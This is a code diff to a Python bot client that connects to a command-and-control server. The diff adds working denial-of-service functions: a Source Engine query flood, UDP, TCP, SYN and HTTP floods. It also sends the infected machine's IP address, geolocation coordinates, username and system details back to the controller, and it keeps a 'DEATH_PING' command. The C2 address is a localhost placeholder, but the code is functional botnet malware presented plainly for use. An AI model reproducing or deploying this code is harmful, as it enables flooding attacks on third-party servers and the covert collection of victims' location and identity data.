@@ -5,9 +5,7 @@ import socket
 import threading
 import random
 import requests
-import setproctitle
-from scapy.all import *
-import geocoder
+from scapy.all import IP, ICMP, send
 import winsdk.windows.devices.geolocation as wdg
 import asyncio
 import platform
@@ -15,18 +13,61 @@ import platform
 # Configuration
 C2_ADDRESS  = '127.0.0.1'
 C2_PORT     = 80
+NOTE        = 'Test device'
 
 base_user_agents = [
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
-    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
-    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
-    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
+    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
+    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
+    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
 ]
 
 def rand_ua():
     return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())
 
+def attack_vse(ip, port, secs):
+    payload = b'\xff\xff\xff\xffTSource Engine Query\x00' # read more at https://developer.valvesoftware.com/wiki/Server_queries
+    while time.time() < secs:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.sendto(payload, (ip, port))
+
+def attack_udp(ip, port, secs, size):
+    while time.time() < secs:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        dport = random.randint(1, 65535) if port == 0 else port
+        data = random._urandom(size)
+        s.sendto(data, (ip, dport))
+
+def attack_tcp(ip, port, secs, size):
+    while time.time() < secs:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            s.connect((ip, port))
+            while time.time() < secs:
+                s.send(random._urandom(size))
+        except:
+            pass
+
+def attack_syn(ip, port, secs):
+    while time.time() < secs:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.setblocking(0)
+        try:
+            dport = random.randint(1, 65535) if port == 0 else port
+            s.connect((ip, dport)) # RST/ACK or SYN/ACK as response
+        except:
+            pass
+
+def attack_http(ip, secs):
+    while time.time() < secs:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            s.connect((ip, 5050))
+            while time.time() < secs:
+                s.send(f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua()}\r\nConnection: keep-alive\r\n\r\n'.encode())
+        except:
+            s.close()
 
 def main():
     c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -83,7 +124,10 @@ def main():
                     s = ' '
                     return system+s+release+s+version
 
-                c2.send(f'IP: {ipaddress}\r\nCoordinates: {GetLoc()}\r\nUser: {username}\r\nSystem: {SystemInfo()}\r\nNote: {NOTE}\r\n'.encode())
+                try:
+                    c2.send(f'IP: {ipaddress}\r\nCoordinates: {GetLoc()}\r\nUser: {username}\r\nSystem: {SystemInfo()}\r\nNote: {NOTE}\r\n'.encode())
+                except:
+                    c2.send(f'IP: {ipaddress}\r\nUser: {username}\r\nSystem: {SystemInfo()}\r\nNote: {NOTE}\r\n'.encode())
 
             elif ("DEATH_PING" in command):
                 command.replace("DEATH_PING", "")
@@ -148,7 +192,6 @@ def main():
 
             elif command == 'PING':
                 c2.send('PONG'.encode())
-
 
             else:
                 pass
